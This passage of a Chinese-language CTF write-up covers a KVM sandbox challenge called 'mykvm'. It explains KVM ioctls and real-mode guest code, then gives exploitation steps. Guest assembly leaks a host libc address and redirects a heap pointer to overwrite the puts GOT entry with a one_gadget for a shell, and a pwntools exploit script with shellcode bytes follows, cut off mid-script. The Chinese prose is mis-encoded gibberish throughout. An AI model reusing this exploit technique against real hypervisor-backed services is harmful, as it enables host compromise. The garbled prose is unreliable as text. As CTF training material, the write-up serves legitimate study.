0x%llx"</span><span class="token punctuation">,</span>        run<span class="token operator">-></span>fail_entry<span class="token punctuation">.</span>hardware_entry_failure_reason<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> KVM_EXIT_INTERNAL_ERROR<span class="token operator">:</span>      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"KVM_EXIT_INTERNAL_ERROR: suberror = 0x%x"</span><span class="token punctuation">,</span>        run<span class="token operator">-></span>internal<span class="token punctuation">.</span>suberror<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> KVM_EXIT_SHUTDOWN<span class="token operator">:</span>      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"KVM_EXIT_SHUTDOWN"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Unhandled reason: %d"</span><span class="token punctuation">,</span> run<span class="token operator">-></span>exit_reason<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨<code>switch</code>è¯­å¥ä¸­ï¼Œåªéœ€è¦æ³¨æ„ä¸¤ç§çŠ¶æ€ï¼Œå³<code>KVM_EXIT_HLT</code>å’Œ<code>KVM_EXIT_IO</code>ï¼Œå‰è€…ç”±æ±‡ç¼–æŒ‡ä»¤<code>hlt</code>è§¦å‘ï¼Œä¼šé€€å‡ºVMã€‚åè€…ç”±æ±‡ç¼–æŒ‡ä»¤<code>in/out</code>è§¦å‘ï¼ŒæŠŠå­—ç¬¦è¾“å‡ºåˆ°è®¾å¤‡ã€‚<code>ioctl(vcpufd, KVM_RUN, NULL)</code>ä¼šä¸€ç›´è¿è¡Œï¼Œç›´åˆ°é€€å‡ºï¼ˆå¦‚<code>hlt</code>ã€<code>out</code>ã€<code>error</code>ï¼‰</p><h2 id="å°è¯•è‡ªå·±çš„VM"><a href="#å°è¯•è‡ªå·±çš„VM" class="headerlink" title="å°è¯•è‡ªå·±çš„VM"></a>å°è¯•è‡ªå·±çš„VM</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬ç›´æ¥å†™16ä½æ±‡ç¼–ä»£ç ï¼Œè®©å…¶è¿è¡Œåœ¨VMçš„å®æ¨¡å¼ä¸‹ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå®ƒè¾“å‡ºä¸€ä¸ªå­—ç¬¦â€œaâ€ï¼š</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">.codemov al, <span class="token number">0x61</span>mov dx, <span class="token number">0x217</span>out dx, alhlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>dx</code> å¯„å­˜å™¨èµ‹å€¼0x217æ˜¯å°†å†…å®¹è¾“å‡ºåˆ°è¿™ä¸ªä¸²è¡Œç«¯å£ã€‚å°†å…¶ç¼–è¯‘æˆ16ä½æ±‡ç¼–ä»£ç ï¼Œå¯ä»¥ä½¿ç”¨nasmï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…·ç½‘ç«™åœ¨çº¿æ±‡ç¼–ï¼š</p><p><a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=&arch=x86-16&as_format=inline#assembly">shell-storm | Online Assembler and Disassembler</a></p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181659435.png" alt="image-20220629181659435"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">uint8_t</span> vmcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\xb0\\x61\\xba\\x17\\x02\\xee\\xf4"</span><span class="token function">kvm</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‰§è¡Œç»“æœï¼ˆå› ä¸ºæ²¡æœ‰è¾“å‡ºæ¢è¡Œç¬¦ï¼Œæ‰€ä»¥å’Œ<code>KVM_EXIT_HLT</code>è¿åœ¨äº†ä¸€èµ·ï¼‰ï¼š</p><pre class="line-numbers language-none"><code class="language-none">aKVM_EXIT_HLT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="é¢˜ç›®é€†å‘åˆ†æ-1"><a href="#é¢˜ç›®é€†å‘åˆ†æ-1" class="headerlink" title="é¢˜ç›®é€†å‘åˆ†æ"></a>é¢˜ç›®é€†å‘åˆ†æ</h1><p>åœ¨äº†è§£äº†KVMçš„æ‰§è¡ŒåŸç†åï¼Œå›åˆ°é¢˜ç›®è¿›è¡Œåˆ†æã€‚</p><p>å› ä¸ºKVMæ¨¡å—æ˜¯å»ºç«‹åœ¨å†…æ ¸ä¸­çš„ï¼Œæ‰€ä»¥çŸ¥é“<code>ioctl</code>çš„å®å®šä¹‰ä¹‹åï¼Œå¯ä»¥åœ¨Linuxå†…æ ¸æºç è¿›è¡Œæœç´¢ã€‚ä»¥<code>KVM_RUN</code>ä¸ºä¾‹ï¼Œå­˜åœ¨äºæºç æ ‘ <strong>&#x2F;include&#x2F;uapi&#x2F;linux&#x2F;kvm.h</strong> å¤´æ–‡ä»¶ä¸­ï¼Œä»¥ä¸‹æ˜¯æœç´¢åˆ°çš„ç»“æœï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181711623.png" alt="image-20220629181711623">å€¼0x80çœ‹èµ·æ¥å’Œé¢˜ç›®ä¸­çš„å®Œå…¨ä¸åŒï¼Œçœ‹æ¥æ˜¯<code>_IO(KVMIO, 0x80)</code>å¯¹å€¼è¿›è¡Œäº†å¤„ç†ï¼Œå¯¹äºè¿™ç§å¤æ‚çš„åµŒå¥—å®å®šä¹‰ï¼Œå¯ä»¥ç›´æ¥å†™ä¸€æ®µCä»£ç æŠŠå®ƒçš„å€¼æ‰“å°å‡ºæ¥ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;linux/kvm.h></span></span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_CREATE_VM 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_CREATE_VM<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_SET_USER_MEMORY_REGION 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_SET_USER_MEMORY_REGION<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_CREATE_VCPU 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_CREATE_VCPU<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_GET_VCPU_MMAP_SIZE 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_GET_VCPU_MMAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_GET_REGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_GET_REGS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_SET_REGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_SET_REGS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_GET_SREGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_GET_SREGS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_SET_SREGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_SET_SREGS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_RUN 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_RUN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å‡ºç»“æœï¼š</p><pre class="line-numbers language-none"><code class="language-none">KVM_CREATE_VM 0xae01KVM_SET_USER_MEMORY_REGION 0x4020ae46KVM_CREATE_VCPU 0xae41KVM_GET_VCPU_MMAP_SIZE 0xae04KVM_GET_REGS 0x8090ae81KVM_SET_REGS 0x4090ae82KVM_GET_SREGS 0x8138ae83KVM_SET_SREGS 0x4138ae84KVM_RUN 0xae80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç°åœ¨è¾“å‡ºçš„å€¼å°±å’Œé¢˜ç›®ä¸­ä¸€æ ·äº†ï¼Œå¯ä»¥æ ¹æ®è¿™äº›å€¼ï¼Œé…åˆä¸Šé¢çš„KVMé¡¹ç›®æºç å¯¹ç¨‹åºè¿›è¡Œè¿˜åŸï¼Œåœ¨IDAä¸­åˆ›å»ºäº†ç»“æ„ä½“å¹¶å‘½åå˜é‡åå°±å¾ˆæ¥è¿‘æºç ï¼Œåˆ†æèµ·æ¥å°±å¾ˆè½»æ¾äº†ã€‚æœ€ç»ˆå¾—åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181726045.png" alt="image-20220629181726045"><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220630144839668.png" alt="image-20220630144839668"></p><h1 id="è¿è¡Œç¨‹åº"><a href="#è¿è¡Œç¨‹åº" class="headerlink" title="è¿è¡Œç¨‹åº"></a>è¿è¡Œç¨‹åº</h1><p>æˆ‘è¿™é‡Œæ˜¯Mac + VMware + Ubuntu 16ï¼Œå¼€å¯äº†VTè™šæ‹ŸåŒ–ä¹Ÿæ‰¾ä¸åˆ°&#x2F;dev&#x2F;kvmï¼Œä½†æ˜¯ubuntu 18&#x2F;20æ˜¯æœ‰è¿™ä¸ªè®¾å¤‡æ–‡ä»¶çš„ï¼ŒVirtualBoxä¹Ÿæ˜¯æœ‰è®¾å¤‡æ–‡ä»¶çš„ï¼Œä½†æ˜¯VirtualBoxå¤ªå¡äº†ï¼Œæ‰€ä»¥æœ€ç»ˆè¿˜æ˜¯å¦¥åï¼Œä½¿ç”¨Windows + VMware + ubuntu + dockeræ¥æ‰§è¡Œç¨‹åºï¼Œåœ¨Ubuntuä¸­ä½¿ç”¨dockerçš„åŸå› æ˜¯å°½å¯èƒ½çš„è¿˜åŸé¢˜ç›®çš„ç¯å¢ƒï¼Œå’Œè¿œç¨‹ä¿æŒä¸€è‡´ã€‚åœ¨dockerä¸­å¼€å¯1234ç«¯å£ï¼Œç„¶ågdbserverç›‘å¬ï¼Œåœ¨ubuntuä¸­è¿œç¨‹è°ƒè¯•ï¼Œå¯åŠ¨æ–¹æ³•å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">sudo docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">1234</span><span class="token operator">:</span><span class="token number">1234</span> <span class="token operator">-</span>p <span class="token number">8888</span><span class="token operator">:</span><span class="token number">8888</span> <span class="token operator">--</span>privileged <span class="token operator">--</span>cap<span class="token operator">-</span>add<span class="token operator">=</span>SYS_PTRACE mykvmgdbserver <span class="token operator">:</span><span class="token number">1234</span> <span class="token operator">--</span>attach PID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="æ¼æ´åˆ©ç”¨åˆ†æ"><a href="#æ¼æ´åˆ©ç”¨åˆ†æ" class="headerlink" title="æ¼æ´åˆ©ç”¨åˆ†æ"></a>æ¼æ´åˆ©ç”¨åˆ†æ</h1><p>ç¨‹åºä¸­æœ€æ˜æ˜¾çš„æ¼æ´ç‚¹åœ¨äº <code>size</code> åˆ¤æ–­ï¼Œå¯å‘ç”Ÿæ•´æ•°æº¢å‡ºï¼š</p><p>![image-20220629181756669](&#x2F;Users&#x2F;wangzhenghan&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220629181756669.png)ä½†æ˜¯é€šè¿‡æµ‹è¯•çš„ç»“æœï¼Œå‘ç°è¿™é‡Œçš„æ¼æ´å¹¶ä¸èƒ½è¿›è¡Œåˆ©ç”¨ï¼Œåœ¨è¿›å…¥<code>run_kvm</code>å‡½æ•°ä¹‹åæœ‰<code>memcpy</code>å‡½æ•°ä½¿ç”¨è¿™ä¸ª<code>size</code>ï¼Œå¦‚æœ<code>size</code>è¿‡å¤§ä¼šå¯¼è‡´<code>memcpy</code>æŠ¥é”™ç¨‹åºå´©æºƒã€‚</p><p>è¿˜æœ‰å¦ä¸€å¤„ä¸å¤ªæ˜æ˜¾çš„æ¼æ´ï¼Œå­˜åœ¨äº<code>run_kvm</code>å‡½æ•°å†…éƒ¨ï¼Œ<code>memcpy</code>ä»æ ˆä¸­æ‹·è´æ•°æ®åˆ°bssæ®µ0x603000å¤„ï¼Œ<code>size</code>æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œè™½ç„¶æ ˆå¤§å°å¤§äºå¯æ§size 0x1000ï¼Œä½†è¿˜æ˜¯ä¸å¯é¿å…çš„æ‹·è´äº†ä¸€äº›å®¿ä¸»æœºçš„æ ˆå†…å®¹åˆ°VMä¸­ï¼Œé€ æˆå†…å­˜æ³„éœ²ï¼Œç¨åä¼šéªŒè¯è¿™ä¸€ç‚¹ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å†™ä¸€æ®µæ±‡ç¼–ä»£ç ï¼Œæ¥éå†æ•´ä¸ªVMç©ºé—´ï¼Œç”±äºæ˜¯å®æ¨¡å¼ï¼Œå¯»å€æœ€å¤šåªèƒ½20ä½ï¼Œæ‰€ä»¥æœ€å¤šå¯ä»¥éå†0ï½0xfffffåœ°å€çš„å†…å®¹ï¼Œå®é™…ä¸Šåªéœ€è¦0xffffå°±è¶³å¤Ÿäº†ï¼Œä¸éœ€è¦å»ç»å°½è„‘æ±å†™16ä½çš„æ®µå¯„å­˜å™¨å¯»å€ã€‚ä»¥ä¸‹ä»£ç ä¼šè¾“å‡ºVMä¸­0ï½0xffffå†…å­˜çš„æ‰€æœ‰å†…å®¹ï¼š</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0</span>mov dx,<span class="token number">0x217</span>.<span class="token keyword">start</span>:mov al,[di]out dx,alinc dicmp di,<span class="token number">0xffff</span>jne .<span class="token keyword">start</span>hlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨pwntoolsæ¥æ”¶è¾“å‡ºå†…å®¹ï¼Œå¹¶å°†å†…å®¹ä¿å­˜æˆæ–‡ä»¶ï¼Œä»¥ä¾¿åˆ†æï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">save_mem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content <span class="token operator">+=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'dumpmem'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨å¯¼å‡ºçš„æ–‡ä»¶ä¸­å¯ä»¥çœ‹åˆ°ä¸€äº›å®¿ä¸»æœºåœ°å€ï¼Œå¤§æ¦‚åç§»åœ¨0x400é™„è¿‘ï¼Œè¯æ˜äº†ä¹‹å‰è¯´è¿‡çš„memcpyæŠŠå®¿ä¸»æœºæ ˆå†…å®¹æ‹·è´äº†è¿›æ¥ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181811450.png" alt="image-20220629181811450">ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬å†™æ±‡ç¼–ä»£ç å°†åç§»ä½ç½®çš„å€¼æ‰“å°å‡ºæ¥å°±å¯ä»¥å®Œæˆæ³„éœ²ã€‚ç»è¿‡è°ƒè¯•åç§»ï¼Œæ³„éœ²åœ°å€çš„æ±‡ç¼–å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0x416</span>mov dx,<span class="token number">0x217</span>.<span class="token keyword">start</span>:mov al,[di]out dx,alinc dicmp di,<span class="token number">0x41e</span>jne .<span class="token keyword">start</span>hlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³„éœ²åæœ‰äº†libcåœ°å€ï¼Œè¦è€ƒè™‘å¦‚ä½•åˆ©ç”¨ã€‚</p><p>ç¨‹åºæ‰§è¡Œå®Œ<code>run_kvm</code>åæœ‰ä¸€ä¸ªäº¤äº’å¯ä»¥è¾“å…¥ï¼Œå¹¶å°†è¾“å…¥å†…å®¹æ‹·è´åˆ°bssæ®µçš„<code>dest</code>å¤„ï¼Œæœ€åè°ƒç”¨<code>puts</code>å‡½æ•°åè¿”å›ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181825152.png" alt="image-20220629181825152">ç”±äº<code>dest</code>å­˜å‚¨<code>malloc</code>çš„ä¸€ä¸ªå †åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åœ¨VMå†…å­˜ä¸­æœç´¢è¿™ä¸ªå †åœ°å€ï¼Œè®¡ç®—å®ƒåœ¨å†…å­˜ä¸­çš„åç§»ï¼Œå°±åƒæ³„éœ²åœ°å€é‚£æ ·ï¼Œç„¶ååœ¨VMä¸­ä½¿ç”¨æ±‡ç¼–å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼Œæ”¹ä¸ºgotè¡¨çš„åœ°å€ï¼Œåœ¨è¦æ±‚è¾“å…¥â€œhost nameâ€œæ—¶å°†<code>puts</code>åœ°å€æ”¹ä¸ºone_gadgetçš„åœ°å€ï¼Œæœ€åè°ƒç”¨<code>puts</code>å…¶å®å°±è°ƒç”¨äº†one_gadgetï¼Œæ‹¿åˆ°shellã€‚</p><p>å¼€å¯ASLRå †åœ°å€ä¼šå‘ç”Ÿå˜åŒ–ï¼Œåœ¨æœç´¢çš„æ—¶å€™ä¸å¤ªæ–¹ä¾¿ï¼Œå¯ä»¥å…³é—­ASLRæ¥ä¿è¯æ¯æ¬¡åˆ†é…çš„åœ°å€éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ–¹ä¾¿æœç´¢ã€‚æˆ‘ä»¬è¿˜æ˜¯ç”¨ä¹‹å‰çš„æ±‡ç¼–å°†å†…å­˜dumpå‡ºæ¥ï¼Œæˆ‘è¿™é‡Œçš„å †åœ°å€0x60b010ï¼Œæ‰¾åˆ°åœ¨åç§»0x7100é™„è¿‘ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181837840.png" alt="image-20220629181837840"></p><p>ä»¥ä¸‹æ˜¯å¼€äº†ASLRçš„æƒ…å†µï¼Œä¹Ÿæ˜¯åœ¨0x7100é™„è¿‘ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181847463.png" alt="image-20220629181847463"></p><p>ç»è¿‡è°ƒè¯•è®¡ç®—å¾—å‡ºåç§»åœ¨0x7100ï¼Œç¼–å†™æ±‡ç¼–ä»£ç ï¼Œå°†æ­¤å¤„æ”¹ä¸ºgoté™„è¿‘çš„åœ°å€ï¼Œè¿™é‡Œå°†å…¶æ”¹ä¸ºäº†0x60200dï¼š</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0x7100</span>mov al,<span class="token number">0x0d</span>mov [di],almov al,<span class="token number">0x20</span>mov [di<span class="token number">+1</span>],almov al,<span class="token number">0x60</span>mov [di<span class="token number">+2</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+3</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+4</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+5</span>],alhlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå‘ç°è¾“å…¥å®Œâ€host nameâ€œåï¼Œ<code>memcpy</code>å‡½æ•°ä¼šå‘0x60200dè¿›è¡Œæ‹·è´ï¼Œè¯æ˜ä¿®æ”¹<code>dest</code>æˆåŠŸï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181857455.png" alt="image-20220629181857455">æ­£å¸¸æ¥è¯´è¿™é‡Œç›´æ¥ä¿®æ”¹<code>puts</code>çš„gotå°±å¯ä»¥äº†ï¼Œä½†è¿˜éœ€è¦è€ƒè™‘ä¸€ä¸ªæƒ…å†µï¼Œ<code>readline</code>å‡½æ•°ä¼šè°ƒç”¨<code>malloc</code>ï¼Œå †ç®¡ç†æ¯”è¾ƒæ··ä¹±ï¼Œå¹¶ä¸”ä¸ä¼šè¯»å…¥ä¸å¯è§å­—ç¬¦ï¼Œå› æ­¤æœ€å¥½æ˜¯ä¿®æ”¹<code>puts</code>çš„æœ€å3ä¸ªbyteæˆåŠŸç‡ä¼šé«˜ä¸€äº›ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæŠŠå†™å…¥åœ°å€è®¾ç½®ä¸º0x60200dçš„åŸå› ã€‚ï¼ˆå¦å¤–ï¼ŒASLRå¯¹äºKVMæœ‰ä¸€å®šçš„å½±å“ï¼Œåœ¨ä¸å¼€å¯ASLRæ—¶ï¼Œéœ€è¦æ³„éœ²çš„å†…å­˜åç§»åœ¨0x9b98ï¼Œä¼šç›´æ¥æ³„éœ²ä¸€ä¸ª<code>main_arena+0x88</code>çš„åœ°å€ï¼ŒæˆåŠŸç‡100%ï¼Œä½†å´æ‰“ä¸é€šå¼€äº†ASLRçš„æƒ…å†µï¼Œå…·ä½“ä»€ä¹ˆåŸå› è¿˜ä¸æ˜¯å¾ˆæ‡‚ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„å­¦ä¹ ï¼‰</p><p>æœ€ç»ˆæ³„éœ²ã€å†™å…¥çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0x416</span>mov dx,<span class="token number">0x217</span>.<span class="token keyword">start</span>:mov al,[di]out dx,alinc dicmp di,<span class="token number">0x41e</span>jne .<span class="token keyword">start</span>mov di,<span class="token number">0x7100</span>mov al,<span class="token number">0x08</span>mov [di],almov al,<span class="token number">0x20</span>mov [di<span class="token number">+1</span>],almov al,<span class="token number">0x60</span>mov [di<span class="token number">+2</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+3</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+4</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+5</span>],alhlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>expä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'sp'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token comment">#io = process("./mykvm")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">8888</span><span class="token punctuation">)</span><span class="token comment">#shellcode = "\xbf\x00\x00\xba\x17\x02\x8a\x05\xee\x47\x83\xff\xff\x75\xf7\xf4"     # search all memory</span><span class="token comment">#shellcode = "\xbf\x16\x04\xba\x17\x02\x8a\x05\xee\x47\x81\xff\x1e\x04\x75\xf6\xf4" # leak where to read</span><span class="token comment">#shellcode = "\xbf\x00\x71\xba\x17\x02\x8a\x05\xee\x47\x81\xff\x08\x71\x75\xf6\xf4" # leak where to write</span>shellcode <span class="token operator">=</span> <span class="token string">"\xbf\x16\x04\xba\x17\x02\x8a\x05\xee\x47\x81\xff\x1e\x04\x75\xf6\xbf\x00\x71\xb0\x0d\x88\x05\xb0\x20\x88\x45\x01\xb0\x60\x88\x45\x02\xb0\x00\x88\x45\x03\xb0\x00\x88\x45\x04\xb0\x00\x88\x45\x05\xf4"</span><span class="token triple-quoted-string string">'''search memory:mov di,0mov dx,0x217.start:mov al,[di]out dx,alinc dicmp di,0xffffjne .starthlt'''</span><span class="token triple-quoted-string string">'''leak libc:mov di,0x416mov dx,0x217.start:mov al,[di]out dx,alinc dicmp di,0x41ejne .starthlt'''</span><span class="token triple-quoted-string string">'''leak mem idx:mov di,0x7100mov dx,0x217.start:mov al,[di]out dx,alinc dicmp di,0x7108jne .starthlt'''</span><span class="token triple-quoted-string string">'''write memory:mov di,0x416mov dx,0x217.start:mov al,[di]out dx,alinc dicmp di,0x41ejne .startmov di,0x7100mov al,0x08mov [di],almov al,0x20mov [di+1],almov al,0x60mov [di+2],almov al,0mov [di+3],almov al,0mov [di+4],almov al,0mov [di+5],alhlt'''</span><span class="token keyword">def</span> <span class="token function">save_mem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content <span class="token operator">+=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'dumpmem'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your code size: \n"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"your code: \n"</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span><span class="token comment"># gdb.attach(io,"b *0x40111d")</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"guest name: "</span><span class="token punctuation">,</span><span class="token string">"unr4v31"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"guest passwd: "</span><span class="token punctuation">,</span><span class="token string">"unr4v31"</span><span class="token punctuation">)</span><span class="token comment"># save_mem()</span><span class="token comment"># raw_input()</span><span class="token keyword">def</span> <span class="token function">findidx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        byte <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> byte <span class="token operator">==</span> <span class="token string">'\x7f'</span><span class="token punctuation">:</span>            <span class="token 